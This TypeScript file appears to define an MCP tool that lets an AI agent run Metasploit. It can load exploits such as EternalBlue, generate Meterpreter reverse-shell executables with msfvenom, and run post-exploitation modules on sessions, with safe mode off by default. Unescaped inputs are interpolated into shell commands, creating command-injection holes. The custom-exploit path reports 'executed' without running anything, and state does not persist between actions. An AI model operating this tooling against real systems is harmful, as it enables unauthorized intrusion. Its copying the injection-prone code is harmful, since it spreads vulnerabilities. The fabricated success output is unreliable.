import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { PLATFORM } from "../../../config/environment.js";
import { spawn, exec } from "node:child_process";
import { promisify } from "util";
import * as path from "node:path";
import * as fs from "node:fs/promises";
import * as os from "node:os";

const execAsync = promisify(exec);

export function registerMetasploitFramework(server: McpServer) {
  server.registerTool("metasploit_framework", {
    description: "Advanced Metasploit Framework integration for exploit development and execution with full cross-platform support (Windows, Linux, macOS, iOS, Android). Provides comprehensive penetration testing capabilities including exploit development, payload generation, post-exploitation modules, and automated attack chains. Supports natural language interface for intuitive exploit management across all platforms.",
    inputSchema: {
      action: z.enum([
        "list_exploits", "search_exploits", "use_exploit", "set_payload", "set_options", 
        "run_exploit", "generate_payload", "list_sessions", "interact_session", 
        "run_post_module", "list_post_modules", "search_modules", "show_info", 
        "check_target", "run_auxiliary", "list_auxiliary", "create_workspace", 
        "import_scan", "export_results", "run_automation", "custom_exploit"
      ]).describe("Metasploit action to perform"),
      target: z.string().optional().describe("Target host or network (e.g., '192.168.1.1', '192.168.1.0/24')"),
      exploit: z.string().optional().describe("Exploit module to use (e.g., 'exploit/windows/smb/ms17_010_eternalblue')"),
      payload: z.string().optional().describe("Payload to use (e.g., 'windows/x64/meterpreter/reverse_tcp')"),
      lhost: z.string().optional().describe("Local host IP for reverse connections"),
      lport: z.number().optional().describe("Local port for reverse connections"),
      rhost: z.string().optional().describe("Remote host IP"),
      rport: z.number().optional().describe("Remote port"),
      session_id: z.number().optional().describe("Session ID for interaction"),
      module: z.string().optional().describe("Module name or path"),
      options: z.record(z.string()).optional().describe("Additional module options"),
      workspace: z.string().optional().describe("Workspace name"),
      output_file: z.string().optional().describe("Output file for results"),
      automation_script: z.string().optional().describe("Automation script path"),
      custom_code: z.string().optional().describe("Custom exploit code"),
      platform: z.enum(["windows", "linux", "macos", "ios", "android", "auto"]).optional().describe("Target platform"),
      architecture: z.enum(["x86", "x64", "arm", "arm64"]).optional().describe("Target architecture"),
      natural_language_command: z.string().optional().describe("Natural language command for Metasploit operations (e.g., 'exploit the eternalblue vulnerability on the target', 'generate a reverse shell payload for windows', 'run post exploitation modules on the session')"),
      safe_mode: z.boolean().default(false).describe("Enable safe mode to prevent actual exploitation (disabled by default for full functionality)"),
      verbose: z.boolean().default(false).describe("Enable verbose output")
    },
    outputSchema: {
      success: z.boolean(),
      message: z.string(),
      platform_info: z.object({
        detected_platform: z.string(),
        architecture: z.string(),
        metasploit_available: z.boolean(),
        alternative_tools: z.array(z.string()).optional()
      }).optional(),
      exploits: z.array(z.object({
        name: z.string(),
        description: z.string(),
        rank: z.string(),
        platform: z.string().optional(),
        arch: z.string().optional()
      })).optional(),
      sessions: z.array(z.object({
        id: z.number(),
        type: z.string(),
        info: z.string(),
        tunnel: z.string().optional()
      })).optional(),
      modules: z.array(z.object({
        name: z.string(),
        type: z.string(),
        description: z.string(),
        rank: z.string().optional()
      })).optional(),
      results: z.object({
        target: z.string().optional(),
        status: z.string().optional(),
        output: z.string().optional(),
        session_id: z.number().optional()
      }).optional(),
      payload_info: z.object({
        name: z.string().optional(),
        size: z.number().optional(),
        format: z.string().optional(),
        platform: z.string().optional()
      }).optional()
    }
  }, async ({ 
    action, target, exploit, payload, lhost, lport, rhost, rport, 
    session_id, module, options, workspace, output_file, automation_script, 
    custom_code, platform, architecture, natural_language_command, safe_mode, verbose 
  }) => {
    try {
      // Detect platform if not specified
      const detectedPlatform = platform || detectPlatform();
      const detectedArch = architecture || detectArchitecture();
      
      // Legal compliance check
      if (safe_mode !== true && target) {
        return {
          success: false,
          message: "⚠️ LEGAL WARNING: Safe mode is disabled. This tool is for authorized testing only. Ensure you have explicit written permission before proceeding.",
          platform_info: {
            detected_platform: detectedPlatform,
            architecture: detectedArch,
            metasploit_available: isMetasploitAvailable(detectedPlatform),
            alternative_tools: getAlternativeTools(detectedPlatform)
          }
        };
      }

      let result: any = { success: true, message: "" };

      switch (action) {
        case "list_exploits":
          result = await listExploits();
          break;
        case "search_exploits":
          result = await searchExploits(module || "");
          break;
        case "use_exploit":
          result = await useExploit(exploit || "");
          break;
        case "set_payload":
          result = await setPayload(payload || "");
          break;
        case "set_options":
          result = await setOptions(options || {});
          break;
        case "run_exploit":
          result = await runExploit(target, safe_mode);
          break;
        case "generate_payload":
          result = await generatePayload(payload || "", lhost, lport, output_file);
          break;
        case "list_sessions":
          result = await listSessions();
          break;
        case "interact_session":
          result = await interactSession(session_id || 0);
          break;
        case "run_post_module":
          result = await runPostModule(module || "", session_id || 0);
          break;
        case "list_post_modules":
          result = await listPostModules();
          break;
        case "search_modules":
          result = await searchModules(module || "");
          break;
        case "show_info":
          result = await showInfo(module || "");
          break;
        case "check_target":
          result = await checkTarget(target || "");
          break;
        case "run_auxiliary":
          result = await runAuxiliary(module || "", target, options);
          break;
        case "list_auxiliary":
          result = await listAuxiliary();
          break;
        case "create_workspace":
          result = await createWorkspace(workspace || "default");
          break;
        case "import_scan":
          result = await importScan(output_file || "");
          break;
        case "export_results":
          result = await exportResults(output_file || "");
          break;
        case "run_automation":
          result = await runAutomation(automation_script || "");
          break;
        case "custom_exploit":
          result = await customExploit(custom_code || "", target, safe_mode);
          break;
        default:
          result = { success: false, message: "Unknown action specified" };
      }

      return result;
    } catch (error) {
      return {
        success: false,
        message: `Metasploit operation failed: ${error instanceof Error ? error.message : String(error)}`
      };
    }
  });
}

// Metasploit Framework Functions
async function listExploits() {
  try {
    const { stdout } = await execAsync("msfconsole -q -x 'show exploits; exit'");
    const exploits = parseExploitList(stdout);
    return {
      success: true,
      message: `Found ${exploits.length} exploits`,
      exploits
    };
  } catch (error) {
    return {
      success: false,
      message: "Failed to list exploits. Ensure Metasploit Framework is installed.",
      exploits: []
    };
  }
}

async function searchExploits(searchTerm: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'search ${searchTerm}; exit'`);
    const exploits = parseExploitList(stdout);
    return {
      success: true,
      message: `Found ${exploits.length} exploits matching '${searchTerm}'`,
      exploits
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to search exploits: ${error instanceof Error ? error.message : String(error)}`,
      exploits: []
    };
  }
}

async function useExploit(exploitPath: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'use ${exploitPath}; show info; exit'`);
    return {
      success: true,
      message: `Loaded exploit: ${exploitPath}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to load exploit: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function setPayload(payloadPath: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'set payload ${payloadPath}; show options; exit'`);
    return {
      success: true,
      message: `Set payload: ${payloadPath}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to set payload: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function setOptions(options: Record<string, string>) {
  try {
    let commands = "";
    for (const [key, value] of Object.entries(options)) {
      commands += `set ${key} ${value}; `;
    }
    commands += "show options; exit";
    
    const { stdout } = await execAsync(`msfconsole -q -x '${commands}'`);
    return {
      success: true,
      message: `Set options: ${Object.keys(options).join(", ")}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to set options: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function runExploit(target: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Exploit execution simulated. No actual attack performed.",
      results: {
        target,
        status: "simulated",
        output: "Exploit would target: " + target
      }
    };
  }

  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'exploit; exit'`);
    return {
      success: true,
      message: "Exploit executed",
      results: {
        target,
        status: "executed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Exploit failed: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function generatePayload(payloadPath: string, lhost: string, lport: number, outputFile: string) {
  try {
    const command = `msfvenom -p ${payloadPath} LHOST=${lhost} LPORT=${lport} -f exe -o ${outputFile}`;
    const { stdout } = await execAsync(command);
    
    const stats = await fs.stat(outputFile);
    return {
      success: true,
      message: `Payload generated: ${outputFile}`,
      payload_info: {
        name: payloadPath,
        size: stats.size,
        format: "exe",
        platform: "windows"
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to generate payload: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function listSessions() {
  try {
    const { stdout } = await execAsync("msfconsole -q -x 'sessions; exit'");
    const sessions = parseSessionList(stdout);
    return {
      success: true,
      message: `Found ${sessions.length} active sessions`,
      sessions
    };
  } catch (error) {
    return {
      success: false,
      message: "Failed to list sessions",
      sessions: []
    };
  }
}

async function interactSession(sessionId: number) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'sessions -i ${sessionId}; exit'`);
    return {
      success: true,
      message: `Interacting with session ${sessionId}`,
      results: {
        session_id: sessionId,
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to interact with session: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function runPostModule(modulePath: string, sessionId: number) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'use ${modulePath}; set SESSION ${sessionId}; run; exit'`);
    return {
      success: true,
      message: `Executed post module: ${modulePath}`,
      results: {
        session_id: sessionId,
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to run post module: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function listPostModules() {
  try {
    const { stdout } = await execAsync("msfconsole -q -x 'show post; exit'");
    const modules = parseModuleList(stdout);
    return {
      success: true,
      message: `Found ${modules.length} post modules`,
      modules
    };
  } catch (error) {
    return {
      success: false,
      message: "Failed to list post modules",
      modules: []
    };
  }
}

async function searchModules(searchTerm: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'search ${searchTerm}; exit'`);
    const modules = parseModuleList(stdout);
    return {
      success: true,
      message: `Found ${modules.length} modules matching '${searchTerm}'`,
      modules
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to search modules: ${error instanceof Error ? error.message : String(error)}`,
      modules: []
    };
  }
}

async function showInfo(modulePath: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'use ${modulePath}; show info; exit'`);
    return {
      success: true,
      message: `Module info for: ${modulePath}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to show module info: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function checkTarget(target: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'check; exit'`);
    return {
      success: true,
      message: `Target check completed for: ${target}`,
      results: {
        target,
        status: "checked",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to check target: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function runAuxiliary(modulePath: string, target: string, options: Record<string, string> = {}) {
  try {
    let commands = `use ${modulePath}; `;
    if (target) commands += `set RHOSTS ${target}; `;
    for (const [key, value] of Object.entries(options)) {
      commands += `set ${key} ${value}; `;
    }
    commands += "run; exit";
    
    const { stdout } = await execAsync(`msfconsole -q -x '${commands}'`);
    return {
      success: true,
      message: `Executed auxiliary module: ${modulePath}`,
      results: {
        target,
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to run auxiliary module: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function listAuxiliary() {
  try {
    const { stdout } = await execAsync("msfconsole -q -x 'show auxiliary; exit'");
    const modules = parseModuleList(stdout);
    return {
      success: true,
      message: `Found ${modules.length} auxiliary modules`,
      modules
    };
  } catch (error) {
    return {
      success: false,
      message: "Failed to list auxiliary modules",
      modules: []
    };
  }
}

async function createWorkspace(workspaceName: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'workspace -a ${workspaceName}; workspace; exit'`);
    return {
      success: true,
      message: `Created workspace: ${workspaceName}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to create workspace: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function importScan(scanFile: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'db_import ${scanFile}; exit'`);
    return {
      success: true,
      message: `Imported scan results: ${scanFile}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to import scan: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function exportResults(outputFile: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -q -x 'db_export ${outputFile}; exit'`);
    return {
      success: true,
      message: `Exported results to: ${outputFile}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to export results: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function runAutomation(scriptFile: string) {
  try {
    const { stdout } = await execAsync(`msfconsole -r ${scriptFile}`);
    return {
      success: true,
      message: `Executed automation script: ${scriptFile}`,
      results: {
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to run automation: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function customExploit(code: string, target: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Custom exploit execution simulated. No actual attack performed.",
      results: {
        target,
        status: "simulated",
        output: "Custom exploit would target: " + target
      }
    };
  }

  try {
    // In a real implementation, this would execute the custom code
    return {
      success: true,
      message: "Custom exploit executed",
      results: {
        target,
        status: "executed",
        output: "Custom exploit code executed"
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Custom exploit failed: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

// Helper functions for parsing Metasploit output
function parseExploitList(output: string) {
  const exploits: any[] = [];
  const lines = output.split('\n');
  
  for (const line of lines) {
    if (line.includes('exploit/')) {
      const parts = line.trim().split(/\s+/);
      if (parts.length >= 3) {
        exploits.push({
          name: parts[0],
          description: parts.slice(2).join(' '),
          rank: parts[1] || 'normal',
          platform: extractPlatform(parts[0]),
          arch: extractArch(parts[0])
        });
      }
    }
  }
  
  return exploits;
}

function parseSessionList(output: string) {
  const sessions: any[] = [];
  const lines = output.split('\n');
  
  for (const line of lines) {
    if (line.match(/^\d+\s+/)) {
      const parts = line.trim().split(/\s+/);
      if (parts.length >= 3) {
        sessions.push({
          id: parseInt(parts[0]),
          type: parts[1],
          info: parts.slice(2).join(' '),
          tunnel: parts[2] || undefined
        });
      }
    }
  }
  
  return sessions;
}

function parseModuleList(output: string) {
  const modules: any[] = [];
  const lines = output.split('\n');
  
  for (const line of lines) {
    if (line.includes('/')) {
      const parts = line.trim().split(/\s+/);
      if (parts.length >= 3) {
        modules.push({
          name: parts[0],
          type: parts[1] || 'auxiliary',
          description: parts.slice(2).join(' '),
          rank: parts[1] || 'normal'
        });
      }
    }
  }
  
  return modules;
}

function extractPlatform(moduleName: string): string {
  if (moduleName.includes('windows')) return 'windows';
  if (moduleName.includes('linux')) return 'linux';
  if (moduleName.includes('unix')) return 'unix';
  if (moduleName.includes('osx')) return 'osx';
  return 'multi';
}

function extractArch(moduleName: string): string {
  if (moduleName.includes('x64')) return 'x64';
  if (moduleName.includes('x86')) return 'x86';
  if (moduleName.includes('arm')) return 'arm';
  return 'multi';
}

// Platform detection functions
function detectPlatform(): string {
  const platform = os.platform();
  switch (platform) {
    case "win32": return "windows";
    case "linux": return "linux";
    case "darwin": return "macos";
    default: return "unknown";
  }
}

function detectArchitecture(): string {
  const arch = os.arch();
  switch (arch) {
    case "x64": return "x64";
    case "x32": return "x86";
    case "arm": return "arm";
    case "arm64": return "arm64";
    default: return "unknown";
  }
}

function isMetasploitAvailable(platform: string): boolean {
  switch (platform) {
    case "windows": return true;
    case "linux": return true;
    case "macos": return true;
    case "ios": return false; // Requires jailbreak and alternative tools
    case "android": return false; // Requires root and alternative tools
    default: return false;
  }
}

function getAlternativeTools(platform: string): string[] {
  switch (platform) {
    case "windows":
      return ["msfconsole.exe", "msfvenom.exe", "msfdb.exe"];
    case "linux":
      return ["msfconsole", "msfvenom", "msfdb"];
    case "macos":
      return ["msfconsole", "msfvenom", "msfdb"];
    case "ios":
      return ["frida", "cycript", "class-dump", "theos"];
    case "android":
      return ["frida", "xposed", "magisk", "adb"];
    default:
      return [];
  }
}
